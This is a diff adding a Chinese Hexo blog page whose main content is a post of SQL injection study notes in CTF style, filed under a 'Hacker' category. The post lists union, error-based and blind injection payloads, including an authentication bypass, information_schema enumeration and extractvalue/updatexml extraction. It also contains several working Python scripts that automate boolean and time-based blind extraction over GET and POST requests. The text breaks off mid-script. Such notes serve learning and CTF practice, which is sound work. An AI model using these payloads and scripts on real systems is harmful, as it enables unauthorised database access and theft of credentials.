@@ -1,0 +1,1682 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="瞄一下学过代码，写一个睡喵的博客">
+<meta property="og:type" content="website">
+<meta property="og:title" content="睡猫的博客">
+<meta property="og:url" content="http://example.com/page/2/index.html">
+<meta property="og:site_name" content="睡猫的博客">
+<meta property="og:description" content="瞄一下学过代码，写一个睡喵的博客">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="？？喵！！">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/page/2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>睡猫的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">睡猫的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">分享代码，记录生活</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/26/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hearder.jpg">
+      <meta itemprop="name" content="？？喵！！">
+      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="睡猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/26/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">SQL注入的学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-26 15:33:14" itemprop="dateCreated datePublished" datetime="2023-03-26T15:33:14+08:00">2023-03-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-14 21:57:38" itemprop="dateModified" datetime="2023-04-14T21:57:38+08:00">2023-04-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Hacker/" itemprop="url" rel="index"><span itemprop="name">Hacker</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>22 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ol>
+<li><p><strong>什么是sql注入</strong>:<br>所谓的sql注入就是通过构造“恶意”的代码,让服务器把提交的数据当做sql语句进行执行,从而查询到想要的信息</p>
+</li>
+<li><p><strong>注入的分类</strong><br>注入大致可以分为<br>按照查询字段  1.<strong>字符型</strong>   2.<strong>数字型(整形)</strong><br>按照注入方法  1.<strong>Union注入</strong>  2.<strong>报错注入</strong>  3.<strong>布尔盲注</strong>  4.<strong>时间盲注</strong></p>
+</li>
+<li><p><strong>什么是注入点</strong><br>注入点就是数据库连接访问的地方,例如URL栏,或是页面提供的表单等<br>如果这个地方会把用户输入的数据误解成SQL语法,则认为这个地方是注入点<br>例如:输入<code>&#39;</code>判断是否存在注入点,报错则说明把<code>&#39;</code>当成代码,存在注入点</p>
+</li>
+<li><p><strong>闭合</strong></p>
+<ol>
+<li><strong>闭合符</strong><br><code>&#39;</code>  <code>&quot;</code>  <code>&#39;)</code>  <code>&quot;)</code>等</li>
+<li><strong>闭合方式判断</strong><br>在语句上加入闭合符,如果页面产生错误,再加上注释符(<code>--+</code>,<code>#</code>,<code>%23</code>)页面又恢复正常,则证明这是该语句的闭合符</li>
+<li><strong>闭合的作用</strong><br>手工闭合前一段查询语句,后面加入其他语句,查询需要的参数,不需要的语句可以用注释符注释</li>
+</ol>
+</li>
+</ol>
+<h1 id="GET提交注入"><a href="#GET提交注入" class="headerlink" title="GET提交注入"></a>GET提交注入</h1><h2 id="字符型与整数型注入的判断"><a href="#字符型与整数型注入的判断" class="headerlink" title="字符型与整数型注入的判断"></a>字符型与整数型注入的判断</h2><p><strong>原理</strong>:字符型需要闭合,两端会有闭合符单引号<code>&#39;&#39;</code>,而数字型不需要闭合符,两种不同类型会把输入的数字与符号理解成不同含义</p>
+<ol>
+<li><code>and 1=1</code>和<code>and 1=2</code><br>如果是数字型,<code>and 1=2</code>时,逻辑错误,页面报错(或无回显),而如果为字符类型,and不会被解析成逻辑判断,只读取第一个字符,不会报错</li>
+<li><strong>减法2-1</strong><br>原理: 有回显的情况下,如果是整数型则会做减法,返回2-1的结果1,如果是字符型只会读取第一个字符2</li>
+</ol>
+<h2 id="列数的判断"><a href="#列数的判断" class="headerlink" title="列数的判断"></a>列数的判断</h2><p>可以利用<code>group by 列数</code>或<code>order by 列数</code>,如果找不到对应列数就会报错,利用二分法快速判断总列数</p>
+<h2 id="Union查询"><a href="#Union查询" class="headerlink" title="Union查询"></a>Union查询</h2><ol start="0">
+<li><p><strong>联合查询特性</strong><br>union查询会临时打印一张虚拟的表,会将新创建的虚拟表中的数据也加入数据库,有时可以根据这个特性,将账号密码加入数据库,然后登入<br>可以在不知道密码的情况下绕过密码登入<br>例如<code>name=1&#39;union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#&amp;pw=123</code>  ps:密码常用md5的方式加密</p>
+</li>
+<li><p><strong>原理</strong><br>利用Union查询,闭合前一句查询语句,然后可以在原本的查询语句后面加入想要的查询语句,但由于Union联合查询的前提 必须有回显,必须列数与类型一致.</p>
+</li>
+<li><p><strong>改变回显位置</strong><br>有时页面只能显示一个内容,第二句内容不显示,可以把原本的第一句内容改为数据库不存在的数据(如<code>id=-1</code>),从而使页面回显想要的内容</p>
+</li>
+<li><p><strong>关键数据库</strong><br><code>information_schema</code>这个数据库里有两张关键的数据表</p>
+<ol>
+<li><code>tables</code>  是所有表名的集合<br>  tables里的<code>table_name</code>字段储存的是表名,<code>table_schema</code>字段储存的是表所在的数据库</li>
+<li><code>columns</code>  是所有字段的集合<br>  columns里的<code>column_name</code>字段储存的是字段名</li>
+</ol>
+</li>
+<li><p><strong>group_concat()</strong><br>确保所有的信息能放在一行显示出来,但是有时显示位不够时,group_concat()可能会显示不全,这时候建议使用limit分页查询</p>
+</li>
+<li><p><strong>爆破当前数据库名</strong></p>
+<ol>
+<li><strong>查询当前数据库</strong><br><code>union select database()</code>  无限定条件</li>
+<li><strong>查询所有数据库</strong><br><code>union select 1,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</code><br>注意:有些时候flag会放在别的数据库</li>
+</ol>
+</li>
+<li><p><strong>爆破表名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
+<p>–限定条件一个,为当前所在的库</p>
+</li>
+<li><p><strong>爆破字段名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;上一步爆破出来的表名&#x27;</span> </span><br></pre></td></tr></table></figure>
+<p>–限定条件两个,1.为当前所在的库,2.上一步爆破出的表名<br>–更新,似乎不要第一个条件也可以,这样可以省略中间的and</p>
+</li>
+<li><p><strong>获取数据</strong><br><code>union select group_concat(爆破字段1,爆破字段2) from 爆破出来的表名</code></p>
+</li>
+</ol>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><ol>
+<li><p><strong>原理</strong><br>前段页面不区别的直接将输入内容拼接成SQL语句,后端执行后也无差别的将结果显示到页面上.<br>构造语句,让错误信息中夹杂可以查询数据内容的查询语句,让返回的错误提示中包含数据库的内容.适用于无回显有报错的情况</p>
+</li>
+<li><p><strong>extractvalue报错</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>extractvalue(<span class="number">100</span>,concat(<span class="number">0x7e</span>,(查询内容)))</span><br></pre></td></tr></table></figure>
+<ol>
+<li>原理:<br> <code>extractvalue()</code>函数的报错是会把报错地址回显出来,利用在extractvalue地址语句中插入sql查询语句,让报错提示把想要的信息回显,<code>(查询语句)</code>中写入对应的查询语句即可</li>
+<li>注意:<br> 100的位置可以随意写,只要不存在的列名会报错即可,<code>concat(参数1,参数2)</code>的作用是将逗号两边的内容拼接起来,而<code>0x7e</code>代表的是字符<code>~</code>,这是extractvalue回显的关键</li>
+<li><code>substring(参数1,参数2,参数3)</code>控制输出 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>extractvalue(<span class="number">100</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="built_in">substring</span>( group_concat(爆破字段<span class="number">1</span>,爆破字段<span class="number">2</span>),<span class="number">1</span>,<span class="number">30</span>)<span class="keyword">from</span> 爆破出的表名 )))</span><br></pre></td></tr></table></figure>
+ 使用原因:extractvalue报错注入默认只能返回三十二个字符,有时无法获取整个数据<br> 用法:参数1是需要查看的数据,参数2是从第几个字符开始看,参数3是看几个字符<br> 当然,这边也可以使用limit,不使用subtring+group_concat <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>extractvalue(<span class="number">100</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span> )))</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p><strong>updatexml报错</strong></p>
+<ol>
+<li><code>updatexml(1,concat(0x7e,(查询内容)),3)</code><br>updatexml在报错注入方面和extractvalue几乎没有差别,只是地址参数变成了第二个,</li>
+</ol>
+</li>
+<li><p><strong>floor报错</strong><br>暂略</p>
+</li>
+</ol>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><ol>
+<li><strong>原理</strong> :适用于页面无回显也无报错,但是页面有真假的区别的情况</li>
+<li><strong>基本格式</strong><br><code>and ascii (substr((查询语句),1,1))&gt;100 --+</code></li>
+<li><code>ascii()</code><br>通过ascii()将查询的数据转为ascii码判断真假,为真,最后结果为1,为假,最后结果为0</li>
+<li><code>substring(参数1,参数2,参数3)</code>控制输出<br>参数1是需要查看的数据,参数2是从第几个字符开始看(从一开始每次加一),参数3是看几个字符(每次一个)</li>
+<li><strong>二分法脚本</strong>:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;查询网址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>    <span class="comment">#储存数据</span></span><br><span class="line">flag =<span class="string">&quot;真值条件&quot;</span></span><br><span class="line">bihe=<span class="string">&quot;?id=1&#x27;&quot;</span>   <span class="comment">#闭合方式</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(left&lt;right):</span><br><span class="line">        payload = <span class="string">f&quot;and ascii (substr((查询语句),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span> --+&quot;</span></span><br><span class="line">        new_url = url +bihe+ payload</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> requests.get(url=new_url).text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right=mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table= table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure>
+注意点:<code>二分法(&lt;,&gt;,+1)</code>, <code>mid = (left + right) // 2</code>要写两个,其中一个在最后<br><strong>另一种写法的二分法</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url=<span class="string">&#x27;&#x27;</span></span><br><span class="line">table=<span class="string">&quot;&quot;</span></span><br><span class="line">bihe=<span class="string">&quot;?id=1&#x27;&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left=<span class="number">31</span></span><br><span class="line">    right=<span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        pyload=<span class="string">f&quot;and ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span> --+&quot;</span></span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> requests.get(url=url+bihe+pyload).text:</span><br><span class="line">            left=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> left==right:</span><br><span class="line">            table += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right=mid</span><br><span class="line"><span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><ol>
+<li><strong>原理</strong>:<br>适用于页面有注入点,可以把输入内容当做代码执行,但是既没有回显也无报错,甚至无法区别真假。这是可以利用<code>sleep()</code>函数测试,如果页面出现延迟,则说明存在注入点</li>
+<li><strong>关键函数</strong><code>if(参数1,参数2,参数3)</code><br>这是SQL的if语法,参数1作为判断,若为真,则返回参数2,若为假,则返回参数三</li>
+<li><strong>基本格式</strong><br><code>and if(ascii (substr((查询语句),1,1))&gt;100,sleep(2),0)--+</code></li>
+<li><strong>时间盲注脚本</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;查询地址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>    <span class="comment">#储存数据</span></span><br><span class="line">bihe=<span class="string">&quot;?id=1&#x27;&quot;</span>   <span class="comment">#闭合方式</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(left&lt;right):</span><br><span class="line">        payload = <span class="string">f&quot;and if(ascii (substr((查询语句),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)--+&quot;</span></span><br><span class="line">        new_url = url +bihe+ payload</span><br><span class="line">        start=time.time()</span><br><span class="line">        requests.get(url=new_url)</span><br><span class="line">        end=time.time()</span><br><span class="line">        <span class="keyword">if</span> end-start&gt;=<span class="number">2</span>:  <span class="comment">#注意,这里要判断基本延迟</span></span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right=mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table= table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure>
+<strong>注意</strong>:基本框架和布尔盲注类似,只要将布尔盲注的真值判断改为时间差即可(当然sql语句也要改),但脚本请求有基本的延迟,需要先判断基本延迟,如果特别卡可以把<code>sleep()</code>的时间改小一点<br><strong>延迟判断</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">start=time.time()</span><br><span class="line">requests.get(url=new_url)</span><br><span class="line">end=time.time()</span><br></pre></td></tr></table></figure>
+在这段语句后面加上一个<code>print(end-start)</code>即可,会不断跳出来数字,偏大的即为成功执行sleep</li>
+</ol>
+<h2 id="文件上传注入"><a href="#文件上传注入" class="headerlink" title="文件上传注入"></a>文件上传注入</h2><p>暂略</p>
+<h2 id="and和or"><a href="#and和or" class="headerlink" title="and和or"></a>and和or</h2><pre><code>如果要实现布尔盲注(需要页面有真假值的反馈),如果使用and,必须保证前半段语句是正确的,如果使用or,则必须保证前半段语句是错误的
+</code></pre>
+<h1 id="POST提交注入"><a href="#POST提交注入" class="headerlink" title="POST提交注入"></a>POST提交注入</h1><p>post提交和get提交的主要区别就是,post提交相对get提交更安全一些,一般的表单等密码输入都是采用post提交</p>
+<h2 id="post提交的闭合判断"><a href="#post提交的闭合判断" class="headerlink" title="post提交的闭合判断"></a>post提交的闭合判断</h2><p>若输入闭合符导致页面报错(或不显示),加上<code>or 1=1 #</code>后可以成功登入,则说明存在注入点,且闭合符为输入闭合符</p>
+<h2 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h2><ol>
+<li><strong>原理</strong><br>post提交在手动注入上和get没有什么区别,但是在python脚本里,get提交是利用字符串的拼接来实现对网址的传参,而post提交则要利用字典</li>
+<li><strong>二分法脚本</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;地址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>  <span class="comment"># 储存数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">        date = &#123;</span><br><span class="line">            <span class="string">&quot;uname&quot;</span>: <span class="string">f&quot;1&#x27; or if(ascii (substr((查询语句),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0) #&quot;</span>,  <span class="comment">#post要提交的数据</span></span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        requests.post(url=url,data=date)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt;=<span class="number">2</span>:  <span class="comment"># 注意,这里要判断基本延迟</span></span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table = table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><ol>
+<li><strong>判断条件</strong><br>如果条件是以图片的形式显示的,需要写成<code>相对路径.jpg</code>,例如<code>../images/flag.jpg</code>(两个小数点<code>..</code>表示上一个目录)</li>
+<li><strong>二分法脚本</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;地址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>  <span class="comment"># 储存数据</span></span><br><span class="line">flag=<span class="string">&#x27;../images/flag.jpg&#x27;</span> <span class="comment">#真值条件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">        date = &#123;</span><br><span class="line">            <span class="string">&quot;uname&quot;</span>: <span class="string">f&quot;1&#x27; or ascii (substr((查询条件),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span> #&quot;</span>,  <span class="comment"># post要提交的数据</span></span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> requests.post(url=url, data=date).text: <span 